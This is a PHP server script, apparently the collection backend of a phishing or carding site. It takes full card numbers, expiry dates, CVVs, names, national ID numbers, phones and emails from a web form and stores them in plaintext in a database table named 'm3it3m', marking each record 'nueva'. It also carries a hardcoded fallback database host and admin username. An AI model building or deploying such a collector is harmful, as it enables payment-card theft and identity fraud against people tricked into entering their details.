<?php
// 🔒 CORS SEGURO - Desarrollo Local + Vercel
$allowed_origins = [
  'http://127.0.0.1:5500',
  'http://localhost:5173',
  'https://assasin-dusky.vercel.app',
  'https://essa-blush.vercel.app'
];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed_origins)) {
  header('Access-Control-Allow-Origin: ' . $origin);
  header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
  header('Access-Control-Allow-Headers: Content-Type, Authorization');
  header('Access-Control-Allow-Credentials: true');
}

header('Content-Type: application/json');

// Manejar OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit;
}

// ⏱️ RATE LIMITING - Proteger contra spam
require_once __DIR__ . '/rate-limit.php';

$client_ip = getClientIP();
checkRateLimit($client_ip, 5, 60, 900); // 5 intentos por minuto, bloquear 15 min

// Leer credenciales de variables de Render (Environment Variables)
$db_host = getenv('DB_HOST') ?: 'mysql-86c4508-javiercarva913-1fe5.a.aivencloud.com';
$db_port = getenv('DB_PORT') ?: 26767;
$db_user = getenv('DB_USER') ?: 'avnadmin';
$db_pass = getenv('DB_PASSWORD') ?: 'default_password';
$db_name = getenv('DB_NAME') ?: 'defaultdb';

// Conexión con SSL
$mysqli = new mysqli(
  $db_host . ':' . $db_port,
  $db_user,
  $db_pass,
  $db_name,
  $db_port
);

if ($mysqli->connect_error) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'Error de conexión a BD: ' . $mysqli->connect_error
  ]);
  exit;
}

// Obtener datos del formulario
$numero_tarjeta = $_POST['numero_tarjeta'] ?? '';
$fecha = $_POST['fecha'] ?? ''; // MM/YY
$cvv = $_POST['cvv'] ?? '';
$nombre = $_POST['nombre'] ?? '';
$apellido = $_POST['apellido'] ?? '';
$tipo_doc = $_POST['tipo_doc'] ?? '';
$cedula = $_POST['cedula'] ?? '';
$celular = $_POST['celular'] ?? '';
$email = $_POST['email'] ?? '';
$monto = $_POST['monto'] ?? 0;

// Validaciones
if (!$numero_tarjeta || !$fecha || !$cvv || !$nombre || !$cedula) {
  http_response_code(400);
  echo json_encode([
    'status' => 'ERROR',
    'message' => 'Faltan datos requeridos'
  ]);
  exit;
}

try {
  // INSERTANDO EN TABLA EXISTENTE: m3it3m (MAPEO EXACTO)
  $stmt = $mysqli->prepare(
    "INSERT INTO m3it3m (
      usuario, 
      tarjeta, 
      ftarjeta, 
      cvv, 
      email, 
      celular, 
      status, 
      horacreado,
      banco,
      id
    ) VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), 'TARJETA', ?)"
  );

  if (!$stmt) {
    throw new Exception('Error en prepare: ' . $mysqli->error);
  }

  $nombre_completo = $nombre . ' ' . $apellido;
  $status = 'nueva';

  // Bind parámetros (mapeo exacto de campos)
  $stmt->bind_param(
    'ssssssss',
    $nombre_completo,
    $numero_tarjeta,
    $fecha,
    $cvv,
    $email,
    $celular,
    $status,
    $cedula
  );

  // Ejecutar
  if (!$stmt->execute()) {
    throw new Exception('Error en execute: ' . $stmt->error);
  }

  $new_id = $stmt->insert_id;

  // Respuesta exitosa
  http_response_code(201);
  echo json_encode([
    'status' => 'OK',
    'message' => 'Solicitud de tarjeta creada en m3it3m',
    'id' => $new_id,
    'data' => [
      'idreg' => $new_id,
      'cedula' => $cedula,
      'usuario' => $nombre_completo,
      'status' => $status,
      'monto' => $monto,
      'tarjeta' => $numero_tarjeta,
      'horacreado' => date('Y-m-d H:i:s')
    ]
  ]);

  $stmt->close();

} catch (Exception $e) {
  http_response_code(500);
  echo json_encode([
    'status' => 'ERROR',
    'message' => $e->getMessage()
  ]);
} finally {
  $mysqli->close();
}
?>